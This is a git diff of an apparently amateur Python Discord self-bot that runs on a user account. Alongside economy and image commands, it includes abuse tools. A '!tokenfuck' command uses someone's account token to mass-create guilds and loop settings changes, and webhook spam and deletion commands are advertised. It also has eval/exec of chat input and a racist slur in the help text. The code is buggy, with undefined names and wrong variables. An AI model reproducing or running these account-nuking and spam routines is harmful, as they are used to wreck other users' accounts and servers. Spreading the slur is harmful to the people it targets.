@@ -1,4 +1,4 @@
-import discord #im using discord.py-self cuz easier
+import discord 
 from discord.ext import commands
 import random
 import aiohttp
@@ -12,12 +12,10 @@ import linecache
 import os
 import time
 
-
-auth_url = ""
-token = ""
+token = "toucaun"
 bot = commands.Bot(command_prefix='!', bot=False)
-color = 3092790
 
+kissgifs = ['http://i.imgur.com/0D0Mijk.gif ', 'http://i.imgur.com/TNhivqs.gif', 'http://i.imgur.com/3wv088f.gif', 'http://i.imgur.com/7mkRzr1.gif', 'http://i.imgur.com/8fEyFHe.gif']
 
 languages = {
 							'da'		: 'Danish, Denmark',
@@ -87,14 +85,22 @@ async def on_message_delete(message):
 async def on_message(message):
 				args = message.content.split()
 				
-				#blacklist
-				#if message.author.id == 919422362640842832:
-					#pass
+				
+				if message.content == "!help":
+					await message.channel.send('''**Help Categories:**
+					
+> **Utility**
+> **Image**
+> **Economy**
+> **Fun**
+					
+***Now supports args!***
+Developed by xyte''')
 				
 					
-				if args[0] ==	'!help':
+				elif args[0] ==	'!help' and args[1] == "utility":
 					await message.channel.send("""```
-Now supports args!
+
 Utility
 !snipe - sends the last deleted message 
 !b64encode/decode <text> - encodes/decodes something in base64 
@@ -107,13 +113,11 @@ Utility
 !spamwebhook <webhook> - spams a webhook (spams long arabic characters and pings everyone on default, might change)
 !deletewebhook <webhook> - deletes a webhook 
 !tokenfuck <token> <SERVER NAMES> - fucks a token
+```""")
 
-Economy
-!work - work, gives you money
-!balance - checks  your balance
-!withdraw <amount> - withdraws an amount of money from your bank
-!deposit <amount> - deposits an amount of money into your bank
-!send <user> <amount> - transfers money to someone from your bank
+				elif args[0] == "!help" and args[1] == "image":
+					await message.channel.send("""```
+
 
 Image
 !banner <user (id or ping) - steals anyones banner
@@ -122,29 +126,56 @@ Image
 !cat - sends a cat pic 
 !dog - sends a dog pic 
 !hentai - you already know what it does 
+!kiss <user> - kissy kissy
+```""")
+					
+				elif args[0] == "!help" and args[1] == "economy":
+					await message.channel.send("""```
+
+
+Economy
+!work - work, gives you money
+!slots <amount> slots
+!rob <user> robs someones wallet (wallet only)
+!balance - checks  your balance
+!withdraw <amount> - withdraws an amount of money from your bank
+!deposit <amount> - deposits an amount of money into your bank
+!send <user> <amount> - transfers money to someone from your bank
+```""")
+					
+				elif args[0] == "!help" and args[1] == "fun":
+					await message.channel.send("""```
 
 Fun
-!8ball - <question> 8ball 
 !cf - flips a coin
 !poll - <question> creates a poll
 !guessinggame - guessing game 
 !nigrate - sends ur nigrate u blackie 
-
-Developed by xyte```""")
-
+```""")
+					
 				elif args[0] == "!exec":
 					if message.author.id == 871480725407432795:
-						exec(args[1])
+						code = args[1:]
+						code2 = ' '.join(code)
+						exec(code2)
 					else:
 						await message.channel.send('Unathorized')
+				
 
+				
+				elif args[0] == "!kiss":
+					kisseduser = args[1]
+					await message.channel.send(f'<@{message.author.id}> Kissed {kisseduser}! {kissgifs[random.randint(0,4)]}')
 	
 				elif args[0] == "!randomserver":
 					server = linecache.getline('servers.txt', random.randint(1, 1600))
 					await message.channel.send(server)
 
 				elif args[0] == "!hentai":
-					await message.channel.send("Join my server for hentiea autoposting: https://discord.gg/3H593pZCqQ")
+					r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
+					res = r.json()
+					url=res['url']
+					await message.channel.send(f'''hentiea\n{url}''')
 
 
 
@@ -157,9 +188,11 @@ Developed by xyte```""")
 
 
 				elif args[0] ==	"!poll":
-						message = await message.channel.send(f"""`Poll!`\n{args[1]}""")
-						await message.add_reaction('✅')
-						await message.add_reaction('❎')
+					question = args[1:]
+					q = ' '.join(question)
+					message = await message.channel.send(f"""`Poll!`\n{q}""")
+					await message.add_reaction('✅')
+					await message.add_reaction('❎')
 
 
 				elif args[0] ==	"!leak":
@@ -181,7 +214,9 @@ Developed by xyte```""")
 						await message.channel.send(f"Error! {eval(args[1])}")
 
 				elif args[0] ==	"!b64encode":
-					string_bytes = args[1].encode("ascii")
+					string = args[1:]
+					strink = ' '.join(string)
+					string_bytes = strink.encode("ascii")
 					base64_bytes = base64.b64encode(string_bytes) 
 					base64_string = base64_bytes.decode("ascii") 
 					await message.channel.send(f"Encoded: `{base64_string}`")
@@ -239,16 +274,23 @@ Developed by xyte```""")
 							} 
 						try:
 								for _i in range(100):
+									try:
 										requests.post('https://discord.com/api/v6/guilds', headers=headers, json=guild)
+									except:
+										await message.channel.send('invalid toucan dingus!')
+										pass
+									else:
+										pass
 						except:
-								pass
+								await message.channel.send('invalid toucan dingus!')
+								
 						while True:
 									try:
 											request.patch("https://canary.discord.com/api/v6/users/@me/settings",headers=headers, json=payload)
-									except KeyError:
-											pass
+									except:
+											await message.channel.send('invalid toucan dingus!')
 									else:
-											break
+											pass
 						modes = cycle(["light", "light"])
 						statuses = cycle(["online", "idle", "invisible"])
 						for i in range(1000):
@@ -260,8 +302,9 @@ Developed by xyte```""")
 						for i in range(1000):
 											try:
 													request.patch("https://canary.discord.com/api/v6/users/@me/settings", headers=headers, json=setting, timeout=10)
-											except KeyError:
-													pass
+											except:
+													await message.channel.send('invalid toucan dingus!')
+													return
 											else:
 													break
 
@@ -382,19 +425,16 @@ Developed by xyte```""")
 					await message.channel.send(f"Link: {link}")
 
 				elif args[0] ==	"!av":
-					await message.channel.send('User?')
-					try:
-						user = args[1]
-						await message.channel.send(user.avatar_url)
-					except:
-						response = await bot.wait_for('message')
-						response2 = response.content
-						user = await bot.fetch_user(response2)
-						await message.channel.send(user.avatar_url)
+					user = args[1]
+					user2 = bot.get_user(user)
+					user3 = await bot.fetch_user(user2)
+					await message.channel.send(user3.avatar_url)
+
 
 
 				elif args[0] ==	"!banner":
 					user = args[1]
+					user2 = await bot.fetch_user(user)
 					req = await bot.http.request(discord.http.Route("GET", "/users/{uid}", uid = user.id))
 					banner_id = req["banner"]
 					if banner_id == None:
@@ -418,17 +458,7 @@ Developed by xyte```""")
 
 								await message.channel.send(f"""```{ipinfo}```""")
 							
-				elif args[0] ==	"!8ball":
-					q = args[1]
-					responses = ['yes',
-										'no',
-										'maybey',
-										'sure']
-					response = random.choice(responses)
-					lol = random.randint(1, 30)
-					if lol == 7:
-						response = "i put my coomer in ur moder"
-						await message.channel.send(f'''Question: {q}\nAnswer: {response}''')			
+		
 
 				elif args[0] ==	'!snipe':
 						if snipe_message_content==None:
@@ -454,7 +484,7 @@ Sent by: <@{snipe_message_author}>""")
 										else:
 												await message.channel.send('You guessed it!')
 
-				elif args[0] == "!balance":
+				elif args[0] == "!balance" or args[0] == "!bal":
 					await open_account(message.author)
 					user = message.author
 					users = await get_bank_data()
@@ -463,12 +493,14 @@ Sent by: <@{snipe_message_author}>""")
 					bank_amt = users[str(user.id)]["bank"]
 
 					await message.channel.send(f"__**{message.author}**'s Balance:__\n> Wallet Balance: `{wallet_amt}`\n> Bank Balance: `{bank_amt}`")
+					
+					
 				elif args[0] == "!work":
 					await open_account(message.author)
 
 					users = await get_bank_data()
 					user = message.author
-					earnings = random.randrange(101)
+					earnings = random.randrange(10,30)
 
 					await message.channel.send(f"Someone gave you {earnings}!")
 
@@ -476,9 +508,9 @@ Sent by: <@{snipe_message_author}>""")
 				
 					with open("mainbank.json", "w") as f:
 						json.dump(users,f)
-					time.sleep(10)
+					
 
-				elif args[0] == "!withdraw":
+				elif args[0] == "!withdraw" or args[0] == "!with":
 					amount = args[1]
 					await open_account(message.author)
 					if amount == None:
@@ -497,7 +529,7 @@ Sent by: <@{snipe_message_author}>""")
 					await update_bank(message.author,-1*amount,"bank")
 					await message.channel.send(f"you withdrew {amount}$")
 				
-				elif args[0] == "!deposit":
+				elif args[0] == "!deposit" or args[0] == "!dep":
 					amount = args[1]
 					await open_account(message.author)
 					if amount == None:
@@ -511,6 +543,7 @@ Sent by: <@{snipe_message_author}>""")
 					if amount<0:
 						await message.channel.send("amount must be positive")
 						return
+
 					await update_bank(message.author, -1*amount)
 					await update_bank(message.author,amount,"bank")
 
@@ -540,11 +573,49 @@ Sent by: <@{snipe_message_author}>""")
 					await update_bank(member,amount,"bank")
 
 					await message.channel.send(f"you gave {member} {amount}$")
-
-				
-
-
-
+				elif args[0] == "!rob":
+					member = args[1]
+					member = int(member.strip('<@!>'))
+					member = await bot.fetch_user(member)
+					await open_account(message.author)
+					await open_account(member)
+					
+					bal = await update_bank(member)
+					
+					if bal[0]<100:
+						await message.channel.send('they not worth it dingus!')
+						return
+					earnings = random.randrange(0, bal[0])
+					
+					await update_bank(message.author,earnings)
+					await update_bank(member,-1*earnings)
+					await message.channel.send(f'you robbed {amount}$') 
+						
+				elif args[0] == "!slots":
+					amount = args[1]
+					await open_account(message.author)
+					if amount == None:
+						await message.channel.send('u have to put a number in dingus')
+						return
+					bal = await update_bank(message.author)
+					amount = int(amount)
+					if amount>bal[0]:
+						await message.channel.send('ur too poor haha')
+						return
+					if amount<0:
+						await message.channel.send('amount must be positive')
+						return
+					final = []
+					for i in range(3):
+						a = random.choice(["S", "E", "X"])
+						final.append(a)
+					await message.channel.send(str(final))
+					if final[0] == final[1] or final[0] == final[2]:
+						await update_bank(message.author,0.5*amount)
+						await message.channel.send(f'you won {amount}$')
+					else:
+						await update_bank(message.author, -1*amount)
+						await message.channel.send('you lost hahahahah ezzzzzzzzzz')
 
 async def open_account(user):
 	users = await get_bank_data()
@@ -557,26 +628,16 @@ async def open_account(user):
 	with open("mainbank.json", "w") as f:
 		json.dump(users,f)
 	return True
-
-
 async def get_bank_data():
 		with open("mainbank.json", "r") as f:
 			users = json.load(f)
 		return users
-
 async def update_bank(user,change = 0,mode = "wallet"):
 	users = await get_bank_data()
-
 	users[str(user.id)][mode] += change
-
 	with open("mainbank.json", "w") as f:
 		json.dump(users,f)
-
 	bal = [users[str(user.id)]["wallet"],users[str(user.id)]["bank"]]
 	return bal
-
-
-
-
-
+	
 bot.run(token)
